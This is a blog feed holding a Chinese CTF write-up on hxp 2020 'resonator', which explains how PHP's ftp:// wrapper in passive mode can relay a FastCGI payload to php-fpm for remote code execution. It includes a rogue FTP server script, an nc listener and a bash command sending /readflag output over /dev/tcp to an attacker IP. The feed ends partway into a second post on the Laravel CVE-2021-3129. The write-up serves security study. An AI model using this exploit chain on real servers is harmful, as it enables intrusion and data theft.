<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>从 hxp 2020 一道题来看利用 ftp 与 php-fpm 对话 RCE</title>
      <link href="/posts/f5e7bdc4/"/>
      <url>/posts/f5e7bdc4/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文章首发于安全客。</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在撰写 CVE-2021-3129 Laravel Debug mode RCE 漏洞分析的文章时，漏洞原作者在文章最后提出了利用 ftp 与 php-fpm 对话 RCE 的思路，同时给出了参考例题 hxp 2020 resonator ，趁着还余有印象，我便写下了这篇文章：</p><p>一是复现 hxp 2020 resonator ，并将其作为例题引入，深入剖析原理，最后再来简单回顾一下 CVE-2021-3129 ，区别两者。</p><p>总之，如有不当，烦请评论捉虫，我会在第一时间响应并评论提示，谢谢。</p><h2 id="引题"><a href="#引题" class="headerlink" title="引题"></a>引题</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>题目源文件：</p><p><a href="https://2020.ctf.link/assets/files/resonator-341a26a12c5ac4ad.tar.xz">https://2020.ctf.link/assets/files/resonator-341a26a12c5ac4ad.tar.xz</a></p><p>hxp 2020 题目虚拟机环境（种子）：</p><p><a href="https://ctf.link/hxp_ctf_2020.ova.torrent">https://ctf.link/hxp_ctf_2020.ova.torrent</a></p><p>为了节省配置环境的时间，我直接用虚拟机搭建了：</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210215142412720.png" alt="image-20210215142412720" style="zoom:80%;" /><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这题只有短小精悍的五行代码：</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="string">&#x27;/tmp/file&#x27;</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>] ?? <span class="string">&#x27;:)&#x27;</span>;</span><br><span class="line">    file_put_contents(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>file 默认路径 <code>/tmp/file</code> ，data 默认下为 <code>:)</code> ，再就是两个文件操作，把 data 数据写进 file 文件，然后读取显示到页面：</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210215142431013.png" alt="image-20210215142431013" style="zoom:80%;" /><p>file 和 data 没有任何限制，也就是说，能任意文件读写，但事实真的那么简单吗？</p><p>Dockerfile</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&#x27;hxp&#123;FLAG&#125;&#x27;</span> &gt; flag.txt &amp;&amp; docker build -t resonator . &amp;&amp; docker run --cap-add=SYS_ADMIN --security-opt apparmor=unconfined -ti -p 8009:80 resonator</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 基于 debian buster 镜像</span></span><br><span class="line">FROM debian:buster</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意下载了 php-fpm</span></span><br><span class="line">RUN DEBIAN_FRONTEND=noninteractive apt-get update &amp;&amp; \</span><br><span class="line">    apt-get install -y \</span><br><span class="line">        nginx \</span><br><span class="line">        php-fpm \</span><br><span class="line">    &amp;&amp; rm -rf /var/lib/apt/lists/</span><br><span class="line"></span><br><span class="line">RUN rm -rf /var/www/html/*</span><br><span class="line">COPY docker-stuff/default /etc/nginx/sites-enabled/default</span><br><span class="line"><span class="meta">#</span><span class="bash"> php-fpm 进程服务的扩展配置文件</span></span><br><span class="line">COPY docker-stuff/www.conf /etc/php/7.3/fpm/pool.d/www.conf</span><br><span class="line"></span><br><span class="line">COPY flag.txt docker-stuff/readflag /</span><br><span class="line"><span class="meta">#</span><span class="bash"> 指定 flag 文件和目录的拥有者变为 ID 1337 组 ID 为 0 的用户</span></span><br><span class="line">RUN chown 0:1337 /flag.txt /readflag &amp;&amp; \</span><br><span class="line"><span class="meta">#</span><span class="bash"> flag 文件仅同用户组可读</span></span><br><span class="line">    chmod 040 /flag.txt &amp;&amp; \</span><br><span class="line"><span class="meta">#</span><span class="bash"> flag 目录所有用户可读可执行，不可写</span></span><br><span class="line">    chmod 2555 /readflag</span><br><span class="line"></span><br><span class="line">COPY index.php /var/www/html/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 指定 /var/www 目录拥有者为 root</span></span><br><span class="line">RUN chown -R root:root /var/www &amp;&amp; \</span><br><span class="line"><span class="meta">#</span><span class="bash"> 在 /var/www 目录下 find 过的目录只能被读和执行，一般文件只读</span></span><br><span class="line">    find /var/www -type d -exec chmod 555 &#123;&#125; \; &amp;&amp; \</span><br><span class="line">    find /var/www -type f -exec chmod 444 &#123;&#125; \;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>进行了非常严格的文件权限设置，我们能自由读写的只有 <code>/tmp/file</code> ，<code>www.conf</code> 配置文件也说明了我们是 <code>www-data</code> 用户组。</p><p><a href="http://www.conf/">www.conf</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[www]</span><br><span class="line">user = www-data</span><br><span class="line">group = www-data</span><br><span class="line">listen = 127.0.0.1:9000</span><br><span class="line">listen.owner = www-data</span><br><span class="line">listen.group = www-data</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>监听端口 9000 ，并且点明了<strong>这是 TCP 通信方式而非 UNIX 域通信</strong>。</p><p>拓展一下 UNIX domain socket 模式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">listen = /opt/php/var/run/php-fpm.sock</span><br><span class="line">or</span><br><span class="line">listen = /dev/shm/php-fpm.sock</span><br></pre></td></tr></table></figure><p>综上，我们要读取 flag 只能通过执行剩下的 readflag 这个二进制文件获取，这就要求我们先 getshell，那么 php-fpm 就有可用之处了——利用 fastcgi 进行 getshell 。</p><p>众所周知，如果可以将任意二进制数据包发送到 php-fpm 服务，则可以执行代码。 此技术通常与 <code>gopher://</code> 协议结合使用（ssrf），该协议受 curl 支持，<strong>但不受 php 支持</strong>。</p><p>因此我们再来看 <a href="https://www.php.net/manual/zh/wrappers.php#wrappers">php支持的协议和封装协议</a> 是否有可代替发二进制包的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">-pass 因为权限问题绝大部分不能利用</span><br><span class="line"></span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">-pass 虽然可以利用 file_get_contents() 访问 URL，但只能发挥扫描端口这些不痛不痒的作用</span><br><span class="line"></span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line"></span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">-pass 无用</span><br><span class="line"></span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">-pass 没有利用链，更何况还需要 phar.readonly = 0</span><br><span class="line"></span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br><span class="line">-pass 以上四个都需要安装 PECL 扩展</span><br></pre></td></tr></table></figure><p>唯一剩下的只有 <code>ftp://</code>  ，况且 ftp 本身也是基于 tcp 的服务，能配合 php-fpm 进行 tcp 通信。</p><p>而关于 ftp，为了后续理解，有必要对其两种传输模式作介绍。</p><blockquote><p><strong>ftp 的两种传输模式</strong></p><p>ftp 有两种使用模式：主动模式（port）和被动模式（pasv）。</p><p>port 要求客户端和服务器端同时打开并且监听一个端口以创建连接。在这种情况下，客户端由于安装了防火墙会产生一些问题，连接有时候会被客户端的防火墙阻止。所以，创立了 pasv 。pasv 只要求服务器端产生一个监听相应端口的进程，这样就可以绕过客户端安装了防火墙的问题。</p><p>ftp 客户端和服务器之间需要建立两条 tcp 连接，一条是控制连接（ 21 端口），用来发送控制指令，另外一条是数据连接（ 20 端口 / 随机端口），真正的文件传输是通过数据连接来完成的。</p><p><strong>两种传输模式的异同</strong></p><p>对于两种传输模式来说，控制连接的建立过程都是一样，均为服务器监听 21 号端口，客户端向服务器的该端口发起 tcp 连接。</p><p>两种传输模式的不同之处体现在数据连接的建立，对于数据连接的建立，主被动模式的不同在于数据连接的建立“服务器”是“主动”还是”被动”：</p><p>port 服务器通过控制连接知道客户端监听的端口后，使用<u>自己的 20 号端口作为源端口</u>，<u>服务器“主动”发起 tcp 数据连接</u>。</p><p>pasv 服务器监听 1024-65535 的一个<u>随机端口</u>，并通过控制连接将该端口告诉客户端，<u>客户端向服务器的该端口发起 tcp 数据连接</u>，这种情况下数据连接的建立相当于服务器是“被动”的。</p><p><img src="http://blog-img-1308029004.cossh.myqcloud.com/v2-2605179569cba296202a9d3250597682_720w.jpg" alt="v2-2605179569cba296202a9d3250597682_720w"></p><p>如图，对于我们这题，显然只能用 pasv 模式，服务器监听的“随机端口”对应 php-fpm 监听的 9000 端口，详细过程我们通过一个实际的 pasv 例子来理解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">testbox1: &#123;/home/p-t/slacker/public_html&#125; % ftp -d testbox2</span><br><span class="line">Connected to testbox2.slacksite.com.</span><br><span class="line">220 testbox2.slacksite.com FTP server ready.</span><br><span class="line">Name (testbox2:slacker): slacker</span><br><span class="line">---&gt; USER slacker</span><br><span class="line">331 Password required for slacker.</span><br><span class="line">Password: TmpPass</span><br><span class="line">---&gt; PASS XXXX</span><br><span class="line">230 User slacker logged in.</span><br><span class="line">---&gt; SYST</span><br><span class="line">215 UNIX Type: L8</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; passive</span><br><span class="line">Passive mode on.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">ftp: setsockopt (ignored): Permission denied</span><br><span class="line">---&gt; PASV</span><br><span class="line">227 Entering Passive Mode (192,168,150,90,195,149).</span><br><span class="line">---&gt; LIST</span><br><span class="line">150 Opening ASCII mode data connection for file list</span><br><span class="line">drwx------   3 slacker    users         104 Jul 27 01:45 public_html</span><br><span class="line">226 Transfer complete.</span><br><span class="line">ftp&gt; quit</span><br><span class="line">---&gt; QUIT</span><br><span class="line">221 Goodbye.</span><br></pre></td></tr></table></figure><p>以上是客户端 testbox1.slacksite.com (192.168.150.80) 发出 <code>PASV</code> 命令以指示其将等待服务器 testbox2.slacksite.com (192.168.150.90) “被动地”提供 ip 和端口号，然后客户端将创建到服务器的数据连接，其中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">227 Entering Passive Mode (192,168,150,90,195,149).</span><br></pre></td></tr></table></figure><p>这就是服务器“被动”返回的 ip 和端口号，分别是 32 位的主机地址和 16 位 tcp 端口地址，这个例子的就是 192.168.150.90 的 195*256 + 149 =  50069 端口。</p><p>选择 ip 地址和端口号后，选择 ip 地址和端口的一方将开始侦听指定的地址/端口，并等待另一方连接。 当对方连接到收听方后，数据传输开始。</p><p>我们这题需要将 ip 端口重定向为 127.0.0.1:9000 来试图 ssrf ，9000 % 256 = 40 ，即可表达为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">227 Entering Passive Mode (127,0,0,1,35,40).</span><br></pre></td></tr></table></figure></blockquote><p>介绍到这，利用过程就很明晰了，引用 <a href="https://github.com/dfyz/ctf-writeups/tree/master/hxp-2020/resonator">dfyz 的 wp</a> 原理图：</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/fake_ftp.png" alt="fake_ftp" style="zoom:80%;" /><p><code>file_put_contents()</code> 用 <code>ftp://</code> 与我们的恶意服务器建立控制连接，使目标发送 <code>PASV</code> 命令，我们“被动”提供 ip 端口至本地 9000 端口，然后建立起数据连接，将 data （fastcgi payload）的内容上传到服务器，最后只需攻击机监听 payload 给定的端口获取 /readflag 执行结果即可。</p><p>我们用 py 脚本来实现这个恶意服务器，关于如何去实现，我们可以本地搭建 ftp 服务器测试被动状态发文件，这里参照了<a href="https://guokeya.github.io/post/gS01eEZwU/">过客大神的wp</a> 的实验图（这是 EPSV 扩展被动模式的数据包，仅供参考）：</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/1610524338840.png" alt="1610524338840" style="zoom:80%;" /><blockquote><p>EPRT / EPSV</p><p>EPRT / EPSV 模式出现的原因是 FTP 仅仅提供了建立在 IPv4 上进行数据通信的能力，它基于网络地址是 32 位这一假设。但是，当 IPv6 出现以后，地址就比 32 位长许多了。原来对 FTP 进行的扩展在多协议环境中有时会失败。我们必须针对 IPv6 对 FTP 再次进行扩展。EPRT、EPSV是 Extended Port / Pasv 的简写。</p></blockquote><p>可以依此得到 PASV 模式脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">port = <span class="number">5555</span></span><br><span class="line">sock = socket.socket()</span><br><span class="line">sock.bind((host, port))</span><br><span class="line">sock.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">conn, address = sock.accept()</span><br><span class="line">conn.send(<span class="string">&quot;220 \n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">&quot;331 \n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">&quot;230 \n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">&quot;200 \n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">&quot;550 \n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># skip EPSV</span></span><br><span class="line">conn.send(<span class="string">&quot;200 \n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 35 * 256 + 40 = 9000</span></span><br><span class="line">conn.send(<span class="string">&quot;227 127,0,0,1,35,40\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">&quot;150 \n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br></pre></td></tr></table></figure><p>可以看到我们多发了一次 <code>200</code> 来 <code>skip EPSV</code>，再发的 <code>227</code> 来提供 ip 端口，为了理解，先看我们单发一次 227 的显示：</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210221031348301.png" alt="image-20210221031348301" style="zoom:80%;" /><p>对照原理图，这并未执行 <code>STOR</code> 命令接收数据并且在服务器保存为文件，为什么呢？</p><p>我们从 <a href="https://github.com/php/php-src/blob/master/ext/standard/ftp_fopen_wrapper.c">php 源码</a> 中可以知晓答案（详细看中文注解）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &#123;&#123;&#123; php_fopen_do_pasv */</span></span><br><span class="line"><span class="built_in">static</span> unsigned short php_fopen_do_pasv(php_stream *stream, char *ip, size_t ip_size, char **phoststart)</span><br><span class="line">&#123;</span><br><span class="line">char tmp_line[<span class="number">512</span>];</span><br><span class="line"><span class="keyword">int</span> result, i;</span><br><span class="line">unsigned short portno;</span><br><span class="line">char *tpath, *ttpath, *hoststart=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#ifdef HAVE_IPV6</span></span><br><span class="line">    <span class="comment">// 先试 EPSV 模式</span></span><br><span class="line"><span class="comment">/* We try EPSV first, needed for IPv6 and works on some IPv4 servers */</span></span><br><span class="line">php_stream_write_string(stream, <span class="string">&quot;EPSV\r\n&quot;</span>);</span><br><span class="line">result = GET_FTP_RESULT(stream);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果得到的状态码不是 229 才试 PASV 模式，这就是为什么我们单发 227 不起作用，仅仅是切换了模式</span></span><br><span class="line"><span class="comment">/* check if we got a 229 response */</span></span><br><span class="line"><span class="keyword">if</span> (result != <span class="number">229</span>) &#123;</span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"><span class="comment">/* EPSV failed, let&#x27;s try PASV */</span></span><br><span class="line">php_stream_write_string(stream, <span class="string">&quot;PASV\r\n&quot;</span>);</span><br><span class="line">result = GET_FTP_RESULT(stream);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 确定收到了 ip 端口号</span></span><br><span class="line"><span class="comment">/* make sure we got a 227 response */</span></span><br><span class="line"><span class="keyword">if</span> (result != <span class="number">227</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 分离 ip 端口号</span></span><br><span class="line"><span class="comment">/* parse pasv command (129, 80, 95, 25, 13, 221) */</span></span><br><span class="line">tpath = tmp_line;</span><br><span class="line"><span class="comment">/* skip over the &quot;227 Some message &quot; part */</span></span><br><span class="line"><span class="keyword">for</span> (tpath += <span class="number">4</span>; *tpath &amp;&amp; !isdigit((<span class="keyword">int</span>) *tpath); tpath++);</span><br><span class="line"><span class="keyword">if</span> (!*tpath) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* skip over the host ip, to get the port */</span></span><br><span class="line">hoststart = tpath;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (; isdigit((<span class="keyword">int</span>) *tpath); tpath++);</span><br><span class="line"><span class="keyword">if</span> (*tpath != <span class="string">&#x27;,&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">*tpath=<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">tpath++;</span><br><span class="line">&#125;</span><br><span class="line">tpath[-<span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">memcpy(ip, hoststart, ip_size);</span><br><span class="line">ip[ip_size-<span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">hoststart = ip;</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>Gopherus 生成 fastcgi payload （图中选中部分复制）:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;/readflag &gt; /dev/tcp/192.168.21.128/6666&quot;</span><br></pre></td></tr></table></figure><p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210221035533698.png" alt="image-20210221035533698"></p><p>运行 py 脚本搭建恶意 ftp 服务器</p><p>监听 6666 端口（视 payload 生成端口而定）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 6666</span><br></pre></td></tr></table></figure><p>网页发送 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=ftp://server:5555/whatever&amp;data=[第一步复制的 payload ]</span><br></pre></td></tr></table></figure><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210221040044311.png" alt="image-20210221040044311" style="zoom:80%;" /><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210221040105384.png" alt="image-20210221040105384" style="zoom:80%;" /><p>getflag</p><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>环境配置及分析等可见我的上一篇文章。</p><p>CVE-2021-3129 对照引题可以精炼成以下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line">file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$newContents</span>);</span><br></pre></td></tr></table></figure><p>引题是先 put 后 get，我们完全靠 put 来实现，put 使我们建立起控制连接，有 <code>data</code> 这个参数传送 payload 。</p><p>这里先 get 后 put ，情况有所不同，漏洞作者的思路是：</p><p>我们将使用 <code>PASV</code> 来使 <code>file_get_contents()</code> 在恶意服务器上下载文件，并且当它尝试使用 <code>file_put_contents()</code> 将其上传回时，我们让它发送文件到 127.0.0.1:9000 （本地有 php-fpm 服务，可以实现稳定 RCE ），实际上，get 所做的只是为了代替引题的 data 传送 payload 。</p><p><img src="http://blog-img-1308029004.cossh.myqcloud.com/6-1614066679210.png" alt="6"></p><p>对此，<a href="https://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247499853&idx=1&sn=225ce332407f61a2181b636e86545dab&chksm=">这篇文章</a> 已经写得很详尽，这里不再赘述，只不过对照上图，目标和恶意 ftp 服务器都在本地，所以第一步的 <code>227</code> 是本地的端口。</p><p><a href="https://github.com/Maskhe/evil_ftp/blob/master/evil_ftp.py">脚本</a></p><p>当然也可以对照我们题目的脚本来改写，第一次连接参照下图即可：</p><img src="http://blog-img-1308029004.cossh.myqcloud.com/image-20210304154058020.png" alt="image-20210304154058020" style="zoom:80%;" /><p>第二次连接的过程完全相同。</p><p>如果想要在本地测试一下这个 ftp 传输过程，可以参考下面的博客搭建服务器：</p><p><a href="https://www.cnblogs.com/zwqh/p/11579264.html">https://www.cnblogs.com/zwqh/p/11579264.html</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>个人认为很不错的 ftp 模式讲解：</p><p><a href="https://southrivertech.com/wp-content/uploads/FTP_Explained1.pdf">https://southrivertech.com/wp-content/uploads/FTP_Explained1.pdf</a></p><p><a href="https://slacksite.com/other/ftp.html">https://slacksite.com/other/ftp.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/37963548">https://zhuanlan.zhihu.com/p/37963548</a></p><p>ftp rfc 文档：</p><p><a href="http://www.faqs.org/rfcs/rfc959.html">http://www.faqs.org/rfcs/rfc959.html</a></p><p>ftp 命令字和响应码：</p><p><a href="https://blog.csdn.net/qq981378640/article/details/51254177">https://blog.csdn.net/qq981378640/article/details/51254177</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全原理研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ftp模式 </tag>
            
            <tag> php-fpm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-3129 Laravel Debug mode 远程代码执行漏洞复现</title>
      <link href="/posts/608ab632/"/>
      <url>/posts/608ab632/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文章首发于安全客。</p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是笔者第一次撰写漏洞分析的文章，Ignition 个人并没有深入的开发经验，所以有部分可能写得不是那么“入行”，在浏览了许多官方文档粗略了解的情况下，复现并分析了这个漏洞。</p><p>总之，如有不当，烦请评论捉虫，我会在第一时间响应并评论提示，谢谢。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Laravel 是基于 MVC 模式的 php 框架，更多框架知识可参考：</p><p><a href="https://www.cnblogs.com/yimingwang/p/9781735.html">Laravel 框架基础知识总结</a></p><p><a href="https://learnku.com/docs/laravel/5.8">Laravel 5.8 中文文档</a></p><p>Ignition 是 Laravel 6 应用程序的默认可自定义的错误页面，它允许在 Flare 上公开分享错误。 如果使用有效的 Flare API key 进行配置，则会跟踪在应用程序中发生的错误，包括堆栈跟踪。</p><p><a href="https://github.com/facade/ignition">Ignition 项目地址</a></p><p><a href="https://flareapp.io/docs/ignition-for-laravel/installation">Ignition 官方文档</a></p><p>这篇建议阅读，会帮助后续理解：</p><p><a href="https://learnku.com/laravel/t/33857">Laravel Ignition 功能全解析</a> </p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>在 Debug 模式下，Laravel 内置的 Ignition 功能某些接口未严格过滤输入数据，导致 <code>file_get_contents()</code> 和 <code>file_put_contents()</code> 函数使用不安全，从而使攻击者能够使用恶意日志文件引起 phar 反序列化攻击，远程执行代码并最终获得服务器权限。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li>Laravel &lt; 8.4.3</li><li>Facade Ignition &lt; 2.5.2</li></ul><h3 id="配置实验环境"><a href="#配置实验环境" class="headerlink" title="配置实验环境"></a>配置实验环境</h3><p><a 